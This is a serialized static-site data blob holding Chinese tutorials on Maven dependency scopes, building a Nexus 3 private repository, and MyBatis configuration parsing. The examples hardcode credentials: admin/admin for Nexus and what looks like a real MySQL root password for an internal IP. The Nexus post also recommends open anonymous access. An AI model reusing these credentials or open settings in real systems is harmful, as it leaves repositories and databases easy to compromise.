import\n   它只使用在 <dependencymanagement> 中，表示从其它的 pom 中导入 dependency 的配置，例如（b 项目导入 a 项目中的包配置）。众所周知，当我们创建一个 springboot 项目时，我们一定会写一个 <parent> 来继承 spring 所提供的所有依赖，但如果我又想使用 spring 提供的依赖，又想继承我自己的项目，此时 import 就有了用武之地\n\n# 普通 springboot 依赖\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.2.6.release</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n</project>\n\n## 更换继承项目，并使用springboot 依赖\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- 变为我自己的父项目 --\x3e\n    <parent>\n        <groupid>com.giant.parent</groupid>\n        <artifactid>boot-parent</artifactid>\n        <version>1.0-snapshot</version>\n        <relativepath/>\n    </parent>\n\n    <groupid>com.giant</groupid>\n    <artifactid>station</artifactid>\n    <version>${project-version}</version>\n    <packaging>pom</packaging>\n\n    <properties>\n        <project-version>1.0.0</project-version>\n    </properties>\n\n    \x3c!-- spring boot 依赖 --\x3e\n    <dependencymanagement>\n        <dependencies>\n            <dependency>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-starter-parent</artifactid>\n                <version>2.2.6.release</version>\n                \x3c!-- 需要指明时pom还是jar --\x3e\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencymanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# optional\n\noptional 是 maven 依赖 jar 时的一个选项，表示该依赖是可选的，不会被依赖传递。例如：b 依赖了日志框架 logback、log4j、apache commons log，这时候 a 引用 b 的 jar，因为 maven 有依赖传递机制，那么 a 项目就会有 3 个 jar 包，logback、log4j、apache commons log。实际上我们一般只会在项目中使用一种日志框架，那么我们项目中就会有多余的依赖，当这种情况时越来越多时，最后整个项目的 jar 包就有很多的多余依赖，导致项目很臃肿。\n\n对于这种情况，我们只要在 b 项目中把 logback、log4j、apache commons log 设置成 <optional>true</optional> 的即可。这时候 a 项目依赖 b 的时候，项目中不会有 logback、log4j、apache commons log 相关 jar 包，可以根据情况自行选择一个即可。\n\n<dependency>\n    <groupid>org.projectlombok</groupid>\n    <artifactid>lombok</artifactid>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# exclusions\n\n用于排除依赖项中，不需要添加的 jar，或者使用自己版本的 jar 而不适用其他人所提供的 jar。如：引用的 spring-boot-starter-data-redis 会帮我们依赖 slf4j-api，但它使用的版本被爆出了 bug，那我要升级到更高版本，引入自己选中的版本。\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-data-redis</artifactid>\n    <version>2.2.6.release</version>\n    <exclusions>\n        \x3c!-- 排除spring-boot-starter-data-redis自带的 slf4j --\x3e\n        <exclusion>\n            <groupid>org.slf4j</groupid>\n            <artifactid>slf4j-api</artifactid>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\x3c!-- 引用更改版本的slf4j --\x3e\n<dependency>\n    <groupid>org.slf4j</groupid>\n    <artifactid>slf4j-api</artifactid>\n    <version>1.7.36</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"使用 Nexus3.x 搭建私服",frontmatter:{title:"使用 Nexus3.x 搭建私服",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/2300.maven/2302.%E4%BD%BF%E7%94%A8%20Nexus3.x%20%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D.html",relativePath:"00.java/2300.maven/2302.使用 Nexus3.x 搭建私服.md",key:"v-5783fd5e",path:"/maven/2302/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'下载地址 https://help.sonatype.com/repomanager3/product-information/download，下载好后进行解压缩会得到两个文件，nexus-3.39.0-01 和 sonatype-work。可以配置 nexus 变量到我们的环境中方便启动，也可以不配置每次都到 nexus-3.39.0-01/bin 下去启动。\n\nNEXUS_HOME: /opt/software/nexus3/nexus-3.39.0-01/\nPATH: %NEXUS_HOME%/bin\n\n\n1\n2\n\n\nnexus 默认使用的是 8081 端口，很多微服务的端口都会从 8080 等开始使用，可以修改 nexus 的端口，具体位置文件为 /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\n启动 nexus 命令\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# 提示信息\nWARNING: ************************************************************\nWARNING: Detected execution as "root" user.  This is NOT recommended!\nWARNING: ************************************************************\n\n# 这个信息需要修改 /opt/software/nexus3/nexus-3.39.0-01/bin/nexus 文件，找到 run_as_root=true，改为如下\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n启动成功后就可以登录 nexus 所提供的客户端界面，登录的时候会问你要账号密码，账号默认是 admin，密码在 /opt/software/nexus3/sonatype-work/nexus3/admin.password 文件中，登录成功后会要求更改密码，密码更改后 admin.password 会自动删除。修改会会让你选择严格模式，建议允许所有人访问，毕竟是私服没太大必要严格。\n\n\n\n\n\n\n\n点击设置、点击仓库，我们可以看到仓库管理配置列表，其中跟 Maven 相关的有 4 个，Maven 相对有 3 个 Type\n\n * proxy，表示为代理仓库，下载组件时，如果代理仓库搜索不到，则把请求转发到远程仓库（默认 https://repo1.maven.org/maven2/，该地址可以修改），并从远程仓库下载，然后将该组件缓存到代理库，当再次请求该组件时，则直接到代理仓库下载，不会再从远程仓库下载。\n * hosted\n   表示宿主仓库，主要用来部署团队内部组件，其中 maven-releases 用来部署团队内部的发布版组件，maven-snapshots 用来部署团队内部的快照版组件。\n * group\n   表示分组仓库，默认将 maven-central、maven-releases、maven-snapshots 三个仓库组合在一起对外提供服务，简化了 maven 客户端在 setting.xml 或 pom.xml 的配置\n\n修改 maven-central 的 proxy 地址，你可以在列表中点击 maven-central，就会进到 maven-central 的编辑页，然后在 Remote storage 修改为阿里云的仓库点击保存即可。\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven 想使用我们自己搭建的 nexus，只需要在 maven-3.8.4\\conf\\settings.xml 文件修改镜像地址即可\n\n  <mirrors>\n\t\x3c!-- 阿里云 --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorOf>central</mirrorOf>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorOf>*</mirrorOf>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> 按照以上的操作，我们只新启动一个项目，并在项目中指定该 maven，此时我们下载的 jar 就会缓存到 nexus 里，当其他同事使用该项目就会发现该项目的依赖下载为我们 nexus 的部署地址。\n\n但是这还不够，在实际开发中，除了我们本身使用的第三方依赖外，我们自己也会写一些依赖包或工具包等，此时若想让其他同事可以下载并依赖使用，我们就需要把我们制作的 jar 发布到 nexus 里去。我们先要在我们的 maven 的 settings.xml 中配置在 nexus 的账号密码\n\n  <servers>\n    <server>\n      \x3c!-- 注意id  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n之后我们只需要创建我们的 jar 并添加一些配置即可，相应配置在代码中有说明\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>org.example</groupId>\n    <artifactId>demoJar</artifactId>\n    \x3c!-- 后缀 SNAPSHOT 就会把 jar 发布到 nexus repository的 maven-snapshots --\x3e\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- 配置 nexus --\x3e\n    <distributionManagement>\n        <repository>\n            \x3c!-- 这里的id邀约 setting.xml 配置的id相同 --\x3e\n            <id>nexus</id>\n            \x3c!-- 配置发布版的名称与路径 --\x3e\n            <name>Nexus Release Repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotRepository>\n            <id>nexus</id>\n            <name>Nexus Snapshot Repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotRepository>\n    </distributionManagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n配置完成后，写好的你的工具类，然后对其进行 maven 包的发布\n\n\n\n\n\n\n\n然后让你的同事进行依赖引入，就可以调用你的方法了。\n\n        <dependency>\n            <groupId>org.example</groupId>\n            <artifactId>demoJar</artifactId>\n            <version>1.0-SNAPSHOT</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> 相同版本的 jar 默认是不能重复发布到 nexus 中的，可以修改你要发布地址的配置，改为 Allow redeploy\n\n\n\n> 如果发现自己上传的包，确定无误后无法下载依赖，不管是自己还是别人，那么可能原因是 Maven 内置的插件远程仓库配置，关闭了对 SNAPSHOT 的支持，防止不稳定的构建。所以解决办法最关键的是：在 maven 的 conf 目录下的 setting.xml 文件中，添加 对 SNAPSHOT 的支持\n\n<snapshots>\n　　<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\n在你 maven setting.xml 里加，或者 pom.xml 里加都行\n\n    <profiles>\n        <profile>\n            <id>central-repo</id>\n            <repositories>\n                <repository>\n                    <id>central</id>\n                    <name>Central-repo</name>\n                    <url>http://******/central</url>\n                    <releases>\n                        <enabled>true</enabled>\n                    </releases>\n                    <snapshots>\n                        <enabled>true</enabled>\n                    </snapshots>\n                </repository>\n            </repositories>\n        </profile>\n    </profiles>\n \n    <activeProfiles>\n        <activeProfile>central-repo</activeProfile>\n    </activeProfiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n如果需要添加两个可以是\n\n    <profile>\n        <repositories>\n            <repository>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>false</enabled>\n                </snapshots>\n                <id>releases</id>\n                <name>release</name>\n                <url>http://***********/maven-releases/</url>\n            </repository>\n            <repository>\n                <releases>\n                    <enabled>false</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n                <id>snapshots</id>\n                <name>libs-snapshot</name>\n                <url>http://***************/maven-snapshots/</url>\n            </repository>\n        </repositories>\n        <id>artifactory</id>\n    </profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',normalizedContent:'下载地址 https://help.sonatype.com/repomanager3/product-information/download，下载好后进行解压缩会得到两个文件，nexus-3.39.0-01 和 sonatype-work。可以配置 nexus 变量到我们的环境中方便启动，也可以不配置每次都到 nexus-3.39.0-01/bin 下去启动。\n\nnexus_home: /opt/software/nexus3/nexus-3.39.0-01/\npath: %nexus_home%/bin\n\n\n1\n2\n\n\nnexus 默认使用的是 8081 端口，很多微服务的端口都会从 8080 等开始使用，可以修改 nexus 的端口，具体位置文件为 /opt/software/nexus3/nexus-3.39.0-01/etc/nexus-default.properties\n\n启动 nexus 命令\n\n./nexus {start|stop|run|run-redirect|status|restart|force-reload}\n\n# 提示信息\nwarning: ************************************************************\nwarning: detected execution as "root" user.  this is not recommended!\nwarning: ************************************************************\n\n# 这个信息需要修改 /opt/software/nexus3/nexus-3.39.0-01/bin/nexus 文件，找到 run_as_root=true，改为如下\nrun_as_root=false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n启动成功后就可以登录 nexus 所提供的客户端界面，登录的时候会问你要账号密码，账号默认是 admin，密码在 /opt/software/nexus3/sonatype-work/nexus3/admin.password 文件中，登录成功后会要求更改密码，密码更改后 admin.password 会自动删除。修改会会让你选择严格模式，建议允许所有人访问，毕竟是私服没太大必要严格。\n\n\n\n\n\n\n\n点击设置、点击仓库，我们可以看到仓库管理配置列表，其中跟 maven 相关的有 4 个，maven 相对有 3 个 type\n\n * proxy，表示为代理仓库，下载组件时，如果代理仓库搜索不到，则把请求转发到远程仓库（默认 https://repo1.maven.org/maven2/，该地址可以修改），并从远程仓库下载，然后将该组件缓存到代理库，当再次请求该组件时，则直接到代理仓库下载，不会再从远程仓库下载。\n * hosted\n   表示宿主仓库，主要用来部署团队内部组件，其中 maven-releases 用来部署团队内部的发布版组件，maven-snapshots 用来部署团队内部的快照版组件。\n * group\n   表示分组仓库，默认将 maven-central、maven-releases、maven-snapshots 三个仓库组合在一起对外提供服务，简化了 maven 客户端在 setting.xml 或 pom.xml 的配置\n\n修改 maven-central 的 proxy 地址，你可以在列表中点击 maven-central，就会进到 maven-central 的编辑页，然后在 remote storage 修改为阿里云的仓库点击保存即可。\n\nhttps://maven.aliyun.com/nexus/content/groups/public/\n\n\n1\n\n\n\n\nmaven 想使用我们自己搭建的 nexus，只需要在 maven-3.8.4\\conf\\settings.xml 文件修改镜像地址即可\n\n  <mirrors>\n\t\x3c!-- 阿里云 --\x3e\n\t\x3c!--\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n      <mirrorof>central</mirrorof>\n    </mirror>\n\t--\x3e\n    <mirror>\n      <id>nexus</id>\n      <mirrorof>*</mirrorof>\n      <url>http://10.240.30.93:9527/repository/maven-public/</url>\n    </mirror>\n  </mirrors>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n> 按照以上的操作，我们只新启动一个项目，并在项目中指定该 maven，此时我们下载的 jar 就会缓存到 nexus 里，当其他同事使用该项目就会发现该项目的依赖下载为我们 nexus 的部署地址。\n\n但是这还不够，在实际开发中，除了我们本身使用的第三方依赖外，我们自己也会写一些依赖包或工具包等，此时若想让其他同事可以下载并依赖使用，我们就需要把我们制作的 jar 发布到 nexus 里去。我们先要在我们的 maven 的 settings.xml 中配置在 nexus 的账号密码\n\n  <servers>\n    <server>\n      \x3c!-- 注意id  nexus--\x3e\n      <id>nexus</id>\n      <username>admin</username>\n      <password>admin</password>\n    </server>\t\n  </servers>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n之后我们只需要创建我们的 jar 并添加一些配置即可，相应配置在代码中有说明\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>org.example</groupid>\n    <artifactid>demojar</artifactid>\n    \x3c!-- 后缀 snapshot 就会把 jar 发布到 nexus repository的 maven-snapshots --\x3e\n    <version>1.0-snapshot</version>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    \x3c!-- 配置 nexus --\x3e\n    <distributionmanagement>\n        <repository>\n            \x3c!-- 这里的id邀约 setting.xml 配置的id相同 --\x3e\n            <id>nexus</id>\n            \x3c!-- 配置发布版的名称与路径 --\x3e\n            <name>nexus release repository</name>\n            <url>>http://10.240.30.93:9527/repository/maven-releases/</url>\n        </repository>\n        <snapshotrepository>\n            <id>nexus</id>\n            <name>nexus snapshot repository</name>\n            <url>http://10.240.30.93:9527/repository/maven-snapshots/</url>\n        </snapshotrepository>\n    </distributionmanagement>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n配置完成后，写好的你的工具类，然后对其进行 maven 包的发布\n\n\n\n\n\n\n\n然后让你的同事进行依赖引入，就可以调用你的方法了。\n\n        <dependency>\n            <groupid>org.example</groupid>\n            <artifactid>demojar</artifactid>\n            <version>1.0-snapshot</version>\n        </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n> 相同版本的 jar 默认是不能重复发布到 nexus 中的，可以修改你要发布地址的配置，改为 allow redeploy\n\n\n\n> 如果发现自己上传的包，确定无误后无法下载依赖，不管是自己还是别人，那么可能原因是 maven 内置的插件远程仓库配置，关闭了对 snapshot 的支持，防止不稳定的构建。所以解决办法最关键的是：在 maven 的 conf 目录下的 setting.xml 文件中，添加 对 snapshot 的支持\n\n<snapshots>\n　　<enabled>true</enabled>\n</snapshots>\n\n\n1\n2\n3\n\n\n在你 maven setting.xml 里加，或者 pom.xml 里加都行\n\n    <profiles>\n        <profile>\n            <id>central-repo</id>\n            <repositories>\n                <repository>\n                    <id>central</id>\n                    <name>central-repo</name>\n                    <url>http://******/central</url>\n                    <releases>\n                        <enabled>true</enabled>\n                    </releases>\n                    <snapshots>\n                        <enabled>true</enabled>\n                    </snapshots>\n                </repository>\n            </repositories>\n        </profile>\n    </profiles>\n \n    <activeprofiles>\n        <activeprofile>central-repo</activeprofile>\n    </activeprofiles>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n如果需要添加两个可以是\n\n    <profile>\n        <repositories>\n            <repository>\n                <releases>\n                    <enabled>true</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>false</enabled>\n                </snapshots>\n                <id>releases</id>\n                <name>release</name>\n                <url>http://***********/maven-releases/</url>\n            </repository>\n            <repository>\n                <releases>\n                    <enabled>false</enabled>\n                </releases>\n                <snapshots>\n                    <enabled>true</enabled>\n                </snapshots>\n                <id>snapshots</id>\n                <name>libs-snapshot</name>\n                <url>http://***************/maven-snapshots/</url>\n            </repository>\n        </repositories>\n        <id>artifactory</id>\n    </profile>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',charsets:{cjk:!0}},{title:"核心功能拆解 工作流程",frontmatter:{title:"核心功能拆解 工作流程",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/300.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.html",relativePath:"00.java/30.Mybatis/31.mybatis/300.核心功能拆解 工作流程.md",key:"v-41b48450",path:"/mybatis/mybatis/300/",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:296},{level:3,title:"加载&解析XML",slug:"加载-解析xml",normalizedTitle:"加载 &amp; 解析 xml",charIndex:null},{level:4,title:"Configuration 初始化配置",slug:"configuration-初始化配置",normalizedTitle:"configuration 初始化配置",charIndex:2012},{level:4,title:"environments 环境解析",slug:"environments-环境解析",normalizedTitle:"environments 环境解析",charIndex:3823},{level:4,title:"mapper 解析",slug:"mapper-解析",normalizedTitle:"mapper 解析",charIndex:4353},{level:4,title:"plugins 插件解析",slug:"plugins-插件解析",normalizedTitle:"plugins 插件解析",charIndex:6325},{level:4,title:"settings 设置解析",slug:"settings-设置解析",normalizedTitle:"settings 设置解析",charIndex:6341},{level:2,title:"准备",slug:"准备",normalizedTitle:"准备",charIndex:299},{level:2,title:"执行",slug:"执行",normalizedTitle:"执行",charIndex:302}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"解析 加载&解析XML Configuration 初始化配置 environments 环境解析 mapper 解析 plugins 插件解析 settings 设置解析 准备 执行",content:'MyBatis 是一个 Java 的 ORM 框架，它使用 XML 或注解来配置和映射 SQL 语句，同时提供了增删改查等常用操作的 API。Mybatis 还提供了许多高级映射和查询功能，例如延迟加载、缓存和批量操作，这使得开发人员可以轻松地编写出高性能、可维护的数据访问层。\n\n关于 MyBatis 我们主要要了解他的工作流程，特性，和部分重要的知识点，就像 Spring，我们主要是了解他的生命周期，可扩展项等，所谓生命周期，也是 Spring 的工作流程。\n\n以下是整个 MyBatis 的工作流程图，对应图中会讲解每个节点重要的知识点。这里要记住 MyBatis 主要的工作模式就是解析、准备和执行，所谓解析就是得到 XML 的信息，维护到一个叫 Configuration 的配置类中；准备就是 opensession 部分，他会得到 Configuration 中的信息，根据执行部分所使用的执行器，数据源，事务等进行实例化和关系映射；使用就是当我们去进行查询或新增等操作，从资源和信息中拿取已被缓存的对象或执行器等，执行对应的方法。\n\n\n\n\n# 解析\n\n解析部分对应图中 加载&解析XML 至 XMLConfigBuilder#mapperElement 这里，可以说是读取 XML 到维护各类对象关系和信息的核心。下面我们分解讲解每个步骤都做了哪些事情以及核心部分解析得到了什么。\n\n\n# 加载 & 解析 XML\n\n这部分主要是读取 mybatis-config-datasource.xml 文件，该文件主要维护了一些公共资源信息，包括环境信息（数据库连接信息），对应的 mapper 文件信息，设置信息等。\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- 设置信息 --\x3e\n    <settings>\n        \x3c!-- 全局缓存：true/false 管理一级缓存和二级缓存的是否使用 --\x3e\n        <setting name="cacheEnabled" value="true"/>\n        \x3c!--缓存级别：SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="STATEMENT"/>\n    </settings>\n    \x3c!-- 环境信息 --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionManager type="JDBC"/>\n            <dataSource type="POOLED">\n                <property name="driver" value="com.mysql.jdbc.Driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="Dev@root2021"/>\n            </dataSource>\n        </environment>\n    </environments>\n    \x3c!-- 维护所有mapper --\x3e\n    <mappers>\n        \x3c!-- XML 配置 --\x3e\n        <mapper resource="mapper/Activity_Mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n读取到文件后调用 XMLConfigBuilder#parse 进行解析，解析内容如下。\n\n# Configuration 初始化配置\n\n在整个文件解析之前，MyBatis 会先把一些信息进行提前初始化，也就是上图中 new Configuration（） 阶段，该类最终会被多个 MyBatis 的类所引用并贯穿整个 MyBatis 工作流程，由于被引用的类太多，这里就不一一列举，我们只要知道他贯穿整个流程即可。\n\n\n\nConfiguration 被初始化时包含了大量的信息，这些信息就是在解析 xml 文件时维护的，逐一讲解下每个配置的具体作用：\n\n * environment：缓存了环境 ID（可设置默认环境，环境包括：开发环境、测试环境等），事务工厂，数据源（有池或无池或其他连接池）等\n * mapperRegistry：映射注册机，缓存每个接口（ 接口对象Class做为key ）所对应的 MapperProxyFactory ，提供添加映射代理类和获取代理类\n * mappedStatements：缓存 SQL 语句的拆解信息。XML 的 namespace.标签ID做为（key） ，value 为 MappedStatement，信息包括： mapper路径 ， SQL类型（SELECT|INSERT等） ， SQL语句 ， 条件 ， 该条语句的缓存信息 ， 返回结果对象 ， 是否缓存标志 等。\n * resultMaps：缓存 resultMap 标签的拆解信息。XML 的 namespace.resultMap做为（key） ，然后对应 value 存放 SQL字段，映射对象字段，字段JAVA数据类型，类型对应的执行器 等\n * interceptorChain：缓存 plugins 标签的拆解信息。会在执行 newParameterHandler，newResultSetHandler，newStatementHandler，newExecutor 进行拦截。\n * typeAliasRegistry：缓存了每个 java 基本类型的封装类，以及 JdbcTransactionFactory，DruidDataSourceFactory，UnpooledDataSourceFactory，PooledDataSourceFactory，PerpetualCache，FifoCache 等 Mybatis 提供的已知类，用于快速解析 XML 描述的值，便于快速得到 Class 信息并获取实例。\n * typeHandlerRegistry：存放对应数据类型的处理策略，比如 JAVA 类型，对应 SQL 类型的处理策略，或 JAVA 类型对应的处理策略。用于设置 SQL 语句参数和获取查询结果的数据类型转换策略。\n * objectFactory：对象工厂，用于创建对象实例，使用反射。\n * objectWrapperFactory：对象包装器，放着，被解析对象的实例，以及对应的 set，get，构造器，类型等信息。 objectFactory 与 objectWrapperFactory 是为 MetaObject 提供支持的，以解析对象信息进行，然后获取对象某个特定属性的数据，缓存是为了加快获取速度，如果属性也是一个对象则会递归缓存，获取值也会递归获取。\n * loadedResources：存放已被加载的 mapper.xml 文件，以防止重复加载\n * languageRegistry：存放默认的语言解析驱动器，比如存放了 XMLLanguageDriver ，提供快速获取这个解析器，然后提供 SQL 解析。\n * cacheEnabled：解析是否启用缓存，该配置对于二级缓存生效，一次缓存是默认缓存。\n * localCacheScope：一级缓存，缓存策略默认是永久缓存，缓存方式分为 SESSION 和 STATEMENT ， SESSION 在该会话中命中相同 sql 语句和条件，若在该 SESSION 中发生 insert/update/delete/commit/rollback/close 则会清除缓存，但是，并不会影响其它会话中的缓存； STATEMENT ，只针对当前会话执行的这一语句有效，执行完毕查询会立即清除缓存。\n * caches：二级缓存，基于 namespace 的缓存，可提供第三方其他方式实现。\n\n# environments 环境解析\n\n在环境解析过程中会得到下面几个重要的属性：\n\n * ID：表明使用哪一个环境做为主要环境配置，解析 XML 中的 <environment > 标签\n * TransactionFactory：解析 XML 中的 <transactionManager> 的 type 属性，如果是 JDBC 则就是 JdbcTransactionFactory ，也可以自行设置，需要自己注册到 typeAliasRegistry 中\n * DataSourceFactory：解析 XML 中 <dataSource> 的 type 属性，如果是 POOLED ，则对应 PooledDataSourceFactory ， UNPOOLED 对应 UnpooledDataSourceFactory ， DRUID 对应 DruidDataSourceFactory\n * DataSource：解析 XML 中 <property> 得到具体的连接信息，从 DataSourceFactory 中获取 DataSource\n\n当以上的信息组件完毕后会封装到 Environment 中，然后添加到 configuration\n\n# mapper 解析\n\n在 mapper 解析中有两种不同的解析，一个是我们常见的 XML 解析，一种是注解，如 @select，这里只讲 XML 解析，有关 @select 等注解解析，放在后续专开一章。那解析首先会读取所到所有的 mapper，在分别解析每个 mapper\n\n    <mappers>\n        \x3c!-- XML 配置 --\x3e\n        <mapper resource="mapper/Activity_Mapper.xml"/>\n    </mappers>\n\n\n1\n2\n3\n4\n\n\n一个完整的 Mapper 大致包含如下信息，所以内部会有多个解析分别解析，如 cache 解析，resultMap 解析，select 解析，insert 解析等，我们这里说下重要的解析对象和作用即可。\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.IActivityDao">\n    <cache eviction="FIFO" flushInterval="600000" size="512" readOnly="true"/>\n    <resultMap id="activityMap" type="cn.bugstack.mybatis.test.po.Activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityId"/>\n        <result column="activity_name" property="activityName"/>\n        <result column="activity_desc" property="activityDesc"/>\n        <result column="create_time" property="createTime"/>\n        <result column="update_time" property="updateTime"/>\n    </resultMap>\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" resultMap="activityMap" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > 标签配置于二级缓存，对于缓存也会有单独的一章讲解，这里只讲解析得到的重要类及作用，通过标签会封装一个 Cache 对象，该对象以 namespace 做为 cache 的 Id ，并把 Cache 对象添加到 configuration 